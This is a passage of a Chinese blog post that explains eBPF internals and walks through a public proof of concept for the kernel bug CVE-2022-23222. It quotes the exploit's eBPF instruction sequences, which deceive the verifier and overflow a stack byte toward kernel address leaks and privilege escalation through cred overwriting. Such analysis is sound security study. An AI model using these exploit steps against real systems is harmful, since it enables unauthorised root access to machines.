<p>伪指令是内核代码中定义的方便理解记忆的助记符，通常是对真实指令的包装。</p>
<p>下文中出现的指令/伪指令及其功能如下：</p>
<table>
<thead>
<tr>
<th align="center">指令/伪指令</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">BPF_MOV64_REG(DST, SRC)</td>
<td align="center">dst = src</td>
</tr>
<tr>
<td align="center">BPF_MOV64_IMM(DST, IMM)</td>
<td align="center">dst_reg = imm32</td>
</tr>
<tr>
<td align="center">BPF_ST_MEM(SIZE, DST, OFF, IMM)</td>
<td align="center">*(uint *) (dst_reg + off16) = imm32</td>
</tr>
<tr>
<td align="center">BPF_STX_MEM(SIZE, DST, SRC, OFF)</td>
<td align="center">*(uint *) (dst_reg + off16) = src_reg</td>
</tr>
<tr>
<td align="center">BPF_LDX_MEM(SIZE, DST, SRC, OFF)</td>
<td align="center">dst_reg = *(uint *) (src_reg + off16)</td>
</tr>
<tr>
<td align="center">BPF_ALU64_IMM(OP, DST, IMM)</td>
<td align="center">dst_reg = dst_reg ‘op’ imm32</td>
</tr>
<tr>
<td align="center">BPF_JMP_IMM(OP, DST, IMM, OFF)</td>
<td align="center">if (dst_reg ‘op’ imm32) goto pc + off16</td>
</tr>
<tr>
<td align="center">BPF_LD_MAP_FD(DST, MAP_FD)</td>
<td align="center">dst = map_fd</td>
</tr>
<tr>
<td align="center">BPF_EXIT_INSN()</td>
<td align="center">exit</td>
</tr>
</tbody></table>
<h3 id="3-2-eBPF寄存器"><a href="#3-2-eBPF寄存器" class="headerlink" title="3.2 eBPF寄存器"></a>3.2 eBPF寄存器</h3><p>eBPF 共有 11 个寄存器，其中 R10 是只读的帧指针，剩余 10 个是通用寄存器。</p>
<ul>
<li>R0: 保存函数返回值，及 eBPF 程序退出值</li>
<li>R1 - R5: 传递函数参数，调用函数保存</li>
<li>R6 - R9: 被调用函数保存</li>
<li>R10: 只读的帧指针</li>
</ul>
<h3 id="3-3-eBPF程序类型"><a href="#3-3-eBPF程序类型" class="headerlink" title="3.3 eBPF程序类型"></a>3.3 eBPF程序类型</h3><p>所有 eBPF 程序类型定义在以下枚举类型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_prog_type &#123;</span><br><span class="line">	BPF_PROG_TYPE_UNSPEC = <span class="number">0</span>,</span><br><span class="line">	BPF_PROG_TYPE_SOCKET_FILTER = <span class="number">1</span>,</span><br><span class="line">	BPF_PROG_TYPE_KPROBE = <span class="number">2</span>,</span><br><span class="line">	BPF_PROG_TYPE_SCHED_CLS = <span class="number">3</span>,</span><br><span class="line">	BPF_PROG_TYPE_SCHED_ACT = <span class="number">4</span>,</span><br><span class="line">	BPF_PROG_TYPE_TRACEPOINT = <span class="number">5</span>,</span><br><span class="line">	BPF_PROG_TYPE_XDP = <span class="number">6</span>,</span><br><span class="line">	BPF_PROG_TYPE_PERF_EVENT = <span class="number">7</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SKB = <span class="number">8</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCK = <span class="number">9</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_IN = <span class="number">10</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_OUT = <span class="number">11</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_XMIT = <span class="number">12</span>,</span><br><span class="line">	BPF_PROG_TYPE_SOCK_OPS = <span class="number">13</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_SKB = <span class="number">14</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_DEVICE = <span class="number">15</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_MSG = <span class="number">16</span>,</span><br><span class="line">	BPF_PROG_TYPE_RAW_TRACEPOINT = <span class="number">17</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCK_ADDR = <span class="number">18</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_SEG6LOCAL = <span class="number">19</span>,</span><br><span class="line">	BPF_PROG_TYPE_LIRC_MODE2 = <span class="number">20</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_REUSEPORT = <span class="number">21</span>,</span><br><span class="line">	BPF_PROG_TYPE_FLOW_DISSECTOR = <span class="number">22</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SYSCTL = <span class="number">23</span>,</span><br><span class="line">	BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE = <span class="number">24</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCKOPT = <span class="number">25</span>,</span><br><span class="line">	BPF_PROG_TYPE_TRACING = <span class="number">26</span>,</span><br><span class="line">	BPF_PROG_TYPE_STRUCT_OPS = <span class="number">27</span>,</span><br><span class="line">	BPF_PROG_TYPE_EXT = <span class="number">28</span>,</span><br><span class="line">	BPF_PROG_TYPE_LSM = <span class="number">29</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_LOOKUP = <span class="number">30</span>,</span><br><span class="line">	BPF_PROG_TYPE_SYSCALL = <span class="number">31</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>下文涉及到的类型只有 BPF_PROG_TYPE_SOCKET_FILTER 。该类型 eBPF 程序通过 setsockopt 附加到指定 socket 上面，对 socket 的流量进行追踪、过滤，可附加的 socket 类型包括 UNIX socket 。</p>
<p>该类型程序的传入参数为结构体 __sk_buff 指针，可通过调用 bpf_skb_load_bytes_relative 辅助函数经由该结构体获取 socket 流量。</p>
<h3 id="3-4-eBPF-map"><a href="#3-4-eBPF-map" class="headerlink" title="3.4 eBPF map"></a>3.4 eBPF map</h3><p>eBPF map 是 eBPF 程序和用户态进行数据交换的媒介。其类型包括：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_map_type &#123;</span><br><span class="line">	BPF_MAP_TYPE_UNSPEC = <span class="number">0</span>,</span><br><span class="line">	BPF_MAP_TYPE_HASH = <span class="number">1</span>,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY = <span class="number">2</span>,</span><br><span class="line">	BPF_MAP_TYPE_PROG_ARRAY = <span class="number">3</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERF_EVENT_ARRAY = <span class="number">4</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_HASH = <span class="number">5</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_ARRAY = <span class="number">6</span>,</span><br><span class="line">	BPF_MAP_TYPE_STACK_TRACE = <span class="number">7</span>,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_ARRAY = <span class="number">8</span>,</span><br><span class="line">	BPF_MAP_TYPE_LRU_HASH = <span class="number">9</span>,</span><br><span class="line">	BPF_MAP_TYPE_LRU_PERCPU_HASH = <span class="number">10</span>,</span><br><span class="line">	BPF_MAP_TYPE_LPM_TRIE = <span class="number">11</span>,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY_OF_MAPS = <span class="number">12</span>,</span><br><span class="line">	BPF_MAP_TYPE_HASH_OF_MAPS = <span class="number">13</span>,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP = <span class="number">14</span>,</span><br><span class="line">	BPF_MAP_TYPE_SOCKMAP = <span class="number">15</span>,</span><br><span class="line">	BPF_MAP_TYPE_CPUMAP = <span class="number">16</span>,</span><br><span class="line">	BPF_MAP_TYPE_XSKMAP = <span class="number">17</span>,</span><br><span class="line">	BPF_MAP_TYPE_SOCKHASH = <span class="number">18</span>,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_STORAGE = <span class="number">19</span>,</span><br><span class="line">	BPF_MAP_TYPE_REUSEPORT_SOCKARRAY = <span class="number">20</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE = <span class="number">21</span>,</span><br><span class="line">	BPF_MAP_TYPE_QUEUE = <span class="number">22</span>,</span><br><span class="line">	BPF_MAP_TYPE_STACK = <span class="number">23</span>,</span><br><span class="line">	BPF_MAP_TYPE_SK_STORAGE = <span class="number">24</span>,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP_HASH = <span class="number">25</span>,</span><br><span class="line">	BPF_MAP_TYPE_STRUCT_OPS = <span class="number">26</span>,</span><br><span class="line">	BPF_MAP_TYPE_RINGBUF = <span class="number">27</span>,</span><br><span class="line">	BPF_MAP_TYPE_INODE_STORAGE = <span class="number">28</span>,</span><br><span class="line">	BPF_MAP_TYPE_TASK_STORAGE = <span class="number">29</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>下文使用到的类型包括 BPF_MAP_TYPE_ARRAY 和 BPF_MAP_TYPE_RINGBUF 。</p>
<p>顾名思义，BPF_MAP_TYPE_ARRAY 类似数组，索引为整形，值可为任意长度的内存对象。</p>
<p>BPF_MAP_TYPE_RINGBUF 是环形缓冲区，如果写入的数据来不及读取，导致积累的数据超过缓冲区长度，新数据则会覆盖掉旧数据。</p>
<h3 id="3-5-eBPF辅助函数"><a href="#3-5-eBPF辅助函数" class="headerlink" title="3.5 eBPF辅助函数"></a>3.5 eBPF辅助函数</h3><p>eBPF 辅助函数（eBPF helper）是可在 eBPF 程序中使用的辅助函数。</p>
<p>内核规定了不同类型的eBPF程序可使用哪些辅助函数，比如，bpf_skb_load_bytes_relative 只有 socket 相关的 eBPF 程序可使用。</p>
<p>各 eBPF 辅助函数的函数原型由内核定义，下文使用到的一些辅助函数的原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_lookup_elem_proto</span> = &#123;</span></span><br><span class="line">	.func		= bpf_map_lookup_elem,</span><br><span class="line">	.gpl_only	= <span class="literal">false</span>,</span><br><span class="line">	.pkt_access	= <span class="literal">true</span>,</span><br><span class="line">	.ret_type	= RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="line">	.arg1_type	= ARG_CONST_MAP_PTR,</span><br><span class="line">	.arg2_type	= ARG_PTR_TO_MAP_KEY,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_ringbuf_reserve_proto</span> = &#123;</span></span><br><span class="line">	.func		= bpf_ringbuf_reserve,</span><br><span class="line">	.ret_type	= RET_PTR_TO_ALLOC_MEM_OR_NULL,</span><br><span class="line">	.arg1_type	= ARG_CONST_MAP_PTR,</span><br><span class="line">	.arg2_type	= ARG_CONST_ALLOC_SIZE_OR_ZERO,</span><br><span class="line">	.arg3_type	= ARG_ANYTHING,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可见 bpf_map_lookup_elem 的返回值类型是 RET_PTR_TO_MAP_VALUE_OR_NULL ，bpf_ringbuf_reserve 的返回值类型是RET_PTR_TO_ALLOC_MEM_OR_NULL 。</p>
<p>各 eBPF 辅助函数的功能可通过 man bpf-helpers 命令查看。</p>
<h3 id="3-6-eBPF-verifier"><a href="#3-6-eBPF-verifier" class="headerlink" title="3.6 eBPF verifier"></a>3.6 eBPF verifier</h3><p>eBPF 程序在加载进内核之前，必须通过 eBPF verifier 的检查。只有符合要求的 eBPF 程序才允许被加载进内核，这是为了防止 eBPF 程序对内核进行破坏。</p>
<p>eBPF verifier 对 eBPF 程序的限制包括：</p>
<ul>
<li>不能调用任意的内核函数，只限于内核模块中列出的 eBPF helper 函数</li>
<li>不允许包含无法到达的指令，防止加载无效代码，延迟程序的终止。</li>
<li>限制循环次数，必须在有限次内结束。</li>
<li>栈大小被限制为 MAX_BPF_STACK，截止到内核 5.10.83 版本，被设置为 512。</li>
<li>限制 eBPF 程序的复杂度，verifier 处理的指令数不得超过 BPF_COMPLEXITY_LIMIT_INSNS，截止到内核 5.10.83 版本，被设置为100万。</li>
<li>限制 eBPF 程序对内存的访问，比如不得访问未初始化的栈，不得越界访问 eBPF map 。</li>
</ul>
<h2 id="四、POC分析"><a href="#四、POC分析" class="headerlink" title="四、POC分析"></a>四、POC分析</h2><p>POC 地址为：https://github.com/tr3ee/CVE-2022-23222</p>
<p>漏洞整体利用思路是通过欺骗 eBPF verifier 泄露内核地址，并实现内核任意地址读、写原语，通过任意读原语搜索进程 cred 所在地址，通过任意写原语修改进程 cred 以实现提权。</p>
<h3 id="4-1-前置准备"><a href="#4-1-前置准备" class="headerlink" title="4.1 前置准备"></a>4.1 前置准备</h3><p>创建 2 个 eBPF map ，类型分别为 BPF_MAP_TYPE_ARRAY 及 BPF_MAP_TYPE_RINGBUF。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ret = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(u32), PAGE_SIZE, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">WARNF(<span class="string">"Failed to create comm map: %d (%s)"</span>, ret, strerror(-ret));</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;comm_fd = ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ret = bpf_create_map(BPF_MAP_TYPE_RINGBUF, <span class="number">0</span>, <span class="number">0</span>, PAGE_SIZE)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">WARNF(<span class="string">"Could not create ringbuf map: %d (%s)"</span>, ret, strerror(-ret));</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;ringbuf_fd = ret;</span><br></pre></td></tr></table></figure>

<p>前者在 POC 中的作用为：</p>
<ol>
<li>和内核交换数据。</li>
<li>泄露其元素的地址。</li>
</ol>
<p>后者的作用则为：</p>
<ol>
<li>和内核交换数据。</li>
<li>通过 bpf_ringbuf_reserve 辅助函数获取 PTR_TO_MEM_OR_NULL 类型指针 。</li>
</ol>
<h3 id="4-2-泄露内核地址"><a href="#4-2-泄露内核地址" class="headerlink" title="4.2 泄露内核地址"></a>4.2 泄露内核地址</h3><p>泄露内核地址的方法为构造特定的 eBFP 程序以利用前述漏洞。</p>
<p>先将 r1 保存到 r9 。r1 在进入 eBPF 程序之前被内核初始化为指向 skb 的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r9 = r1</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_9, BPF_REG_1)</span><br></pre></td></tr></table></figure>

<p>获取 array 指针，保存在 r0 。调试发现，array 指针都是 0xFFFF…10 这种格式。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r0 = bpf_lookup_elem(ctx-&gt;comm_fd, 0)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd)</span><br><span class="line">BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, <span class="number">0</span>)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_2, BPF_REG_10)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem)</span><br></pre></td></tr></table></figure>

<p>上一步获取的 r0 类型为 PTR_TO_MAP_VALUE_OR_NULL 。进行以下判断后，在 false 分支 r0 类型就变成 PTR_TO_MAP_VALUE。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if (r0 == NULL) exit(1)</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">1</span>)</span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>将 array 指针保存进 r8。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r8 = r0</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_8, BPF_REG_0)</span><br></pre></td></tr></table></figure>

<p>调用 bpf_ringbuf_reserve 函数，请求 PAGE_SIZE 的 ringbuf 内存，返回值为 PTR_TO_MEM_OR_NULL 类型指针，属于漏洞中没有过滤的指针类型。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r0 = bpf_ringbuf_reserve(ctx-&gt;ringbuf_fd, PAGE_SIZE, 0)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;ringbuf_fd)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x00</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_reserve)</span><br></pre></td></tr></table></figure>

<p>复制 r0 到 r1 ，r1 的类型变为 PTR_TO_MEM_OR_NULL ，id 也变成 r0 的 id 。这里提一下，verifier 会维护 eBPF 寄存器的 id 属性，用于追踪指针类型的来源。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r0 = r1</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_0)</span><br></pre></td></tr></table></figure>

<p>之后，r1 自身加 1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r1 = r1 + 1</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>参考 adjust_ptr_min_max_vals 函数的代码，在指针加减操作中，目标寄存器的 id 和类型会变成指针寄存器的 id 和类型。由于在上一步中  r1 既是目标寄存器也是指针寄存器，其 id 和类型保持不变。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_ptr_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">				   struct bpf_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">const</span> struct bpf_reg_state *ptr_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">const</span> struct bpf_reg_state *off_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In case of 'scalar += pointer', dst_reg inherits pointer type and id.</span></span><br><span class="line"><span class="comment">	 * The id may be overwritten later if we create a new variable offset.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;type = ptr_reg-&gt;type;</span><br><span class="line">	dst_reg-&gt;id = ptr_reg-&gt;id;</span><br><span class="line">	</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查 r0 是否为 NULL 。事实上，r0 不为 NULL 的情况不可能发生。ringbuf 的大小虽然为 PAGE_SIZE ，但其中一部分用于存储关于 ringbuf 的结构体，剩下的才用于存储数据。因此，请求保留 PAGE_SIZE 的内存不可能实现。经过此步骤后，r0 的类型变为 SCALAR_VALUE ，其值为 0 。那么，与 r0 具有相同 id 的 r1 的类型和值又会如何变化呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if (r0 != NULL) &#123; ringbuf_discard(r0, 1); exit(2); &#125;</span></span><br><span class="line">BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_0)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, <span class="number">1</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_discard)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">2</span>)</span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>check_cond_jmp_op 是 verifier 中检查 JMP 指令的函数，当 JMP 指令的条件是 *OR_NULL 类型指针和 0 比较时，会通过 mark_ptr_or_null_regs 函数改变不同分支中寄存器的类型。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_cond_jmp_op</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">			     struct bpf_insn *insn, <span class="keyword">int</span> *insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* detect if R == 0 where R is returned from bpf_map_lookup_elem().</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">NOTE:</span> these optimizations below are related with pointer comparison</span></span><br><span class="line"><span class="comment">	 *       which will never be JMP32.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!is_jmp32 &amp;&amp; BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">	    insn-&gt;imm == <span class="number">0</span> &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">	    reg_type_may_be_null(dst_reg-&gt;type)) &#123;</span><br><span class="line">		<span class="comment">/* Mark all identical registers in each branch as either</span></span><br><span class="line"><span class="comment">		 * safe or unknown depending R == 0 or R != 0 conditional.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		mark_ptr_or_null_regs(this_branch, insn-&gt;dst_reg,</span><br><span class="line">				      opcode == BPF_JNE);</span><br><span class="line">		mark_ptr_or_null_regs(other_branch, insn-&gt;dst_reg,</span><br><span class="line">				      opcode == BPF_JEQ);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mark_ptr_or_null_regs 函数又调用了 __mark_ptr_or_null_regs 函数，在后者中，所有相同 id 的寄存器都会被 mark_ptr_or_null_reg 函数进行相同的处理。因此，后续 r1 也会变成 SCALAR_VALUE 类型，且 verifier 认为其值为 0 。然而，事实上 r1 的值为 1 。这就是漏洞所在，PTR_TO_MEM_OR_NULL 类型的指针无论经过加减运算变成何值，只要经过是否为 NULL 的判断，在其中一个分支 verifier 都会认为其值为 0 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_ptr_or_null_regs(struct bpf_func_state *state, u32 id,</span><br><span class="line">				    <span class="keyword">bool</span> is_null)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_BPF_REG; i++)</span><br><span class="line">		mark_ptr_or_null_reg(state, &amp;state-&gt;regs[i], id, is_null);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mark_ptr_or_null_reg</span><span class="params">(struct bpf_func_state *state,</span></span></span><br><span class="line"><span class="function"><span class="params">				 struct bpf_reg_state *reg, u32 id,</span></span></span><br><span class="line"><span class="function"><span class="params">				 <span class="keyword">bool</span> is_null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">if</span> (WARN_ON_ONCE(reg-&gt;smin_value || reg-&gt;smax_value ||</span><br><span class="line">				 !tnum_equals_const(reg-&gt;var_off, <span class="number">0</span>) ||</span><br><span class="line">				 reg-&gt;off)) &#123;</span><br><span class="line">			__mark_reg_known_zero(reg);</span><br><span class="line">			reg-&gt;off = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (is_null) &#123;</span><br><span class="line">			reg-&gt;type = SCALAR_VALUE;</span><br><span class="line">		&#125;</span><br><span class="line">   </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着，将 r1+8 保存到 r7 。verifier 认为 r7 值为 8 ，实际上 r7 值为 9 。再将 array 指针 r8 加上 0xE0 的值保存到 r10-8 处，之所以加上 0xE0 是为了泄露更多数据，后面会补充说明。</p>
<p><img src="images/01.jpg" alt></p>
<p>通过 bpf_skb_load_bytes_relative 向 r10-16 写入 r7 个字节，即 9 个字节，溢出了 1 个字节。所写入的数据是可控的，可在用户态通过写入 socket 传递进内核态。在这里将控制写入数据为全零数据，即 r10-8 处的字节会被 0x00 覆盖。</p>
<p><img src="images/02.jpg" alt></p>
